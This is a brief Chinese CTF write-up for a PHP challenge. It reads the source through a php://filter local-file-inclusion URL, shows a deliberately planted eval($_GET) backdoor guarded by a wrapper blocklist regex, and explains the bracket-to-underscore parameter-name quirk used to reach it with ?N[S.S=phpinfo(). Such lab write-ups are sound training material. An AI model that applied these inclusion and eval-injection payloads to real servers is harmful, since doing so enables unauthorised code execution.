# 

## filter协议读取源码

```md
http://node5.anna.nssctf.cn:25003/index.php?file=php://filter/convert.base64-encode/resource=index.php
```

```md
PD9waHANCmVycm9yX3JlcG9ydGluZygwKTsNCg0KaWYgKGlzc2V0KCRfR0VUWydOX1MuUyddKSkgew0KICAgIGV2YWwoJF9HRVRbJ05fUy5TJ10pOw0KfQ0KDQppZighaXNzZXQoJF9HRVRbJ2ZpbGUnXSkpIHsNCiAgICBoZWFkZXIoJ0xvY2F0aW9uOi9pbmRleC5waHA/ZmlsZT0nKTsNCn0gZWxzZSB7DQogICAgJGZpbGUgPSAkX0dFVFsnZmlsZSddOw0KDQogICAgaWYgKCFwcmVnX21hdGNoKCcvXC5cLnxsYXxkYXRhfGlucHV0fGdsb2J8Z2xvYmFsfHZhcnxkaWN0fGdvcGhlcnxmaWxlfGh0dHB8cGhhcnxsb2NhbGhvc3R8XD98XCp8XH58emlwfDd6fGNvbXByZXNzL2lzJywgJGZpbGUpKSB7DQogICAgICAgIGluY2x1ZGUgJGZpbGU7DQogICAgfSBlbHNlIHsNCiAgICAgICAgZGllKCdlcnJvci4nKTsNCiAgICB9DQp9
```

```php
<?php error_reporting(0);
if (isset($_GET['N_S.S'])) {
    eval ($_GET['N_S.S']);
}
if (!isset($_GET['file'])) {
    header('Location:/index.php?file=');
} else {
    $file = $_GET['file'];
    if (!preg_match('/\.\.|la|data|input|glob|global|var|dict|gopher|file|http|phar|localhost|\?|\*|\~|zip|7z|compress/is', $file)) {
        include $file;
    } else {
        die('error.');
    }
} ?>
```

## 知识点: 

根据php解析特性，如果字符串中存在 [、. 等符号，php会将其转换为_且只转换一次，因此我们直接构造nss_ctfer.vip的话，最后php执行的是nss_ctfer_vip，因此我们将前面的_用[代替

当PHP版本小于8时，如果参数中出现中括号[，中括号会被转换成下划线_，但是会出现转换错误导致接下来如果该参数名中还有非法字符并不会继续转换成下划线_，也就是说如果中括号[出现在前面，那么中括号[还是会被转换成下划线_，但是因为出错导致接下来的非法字符并不会被转换成下划线

所以构造: ?N[S.S=phpinfo();
flag就在phpinfo()里面, 就出来了;

```md

```
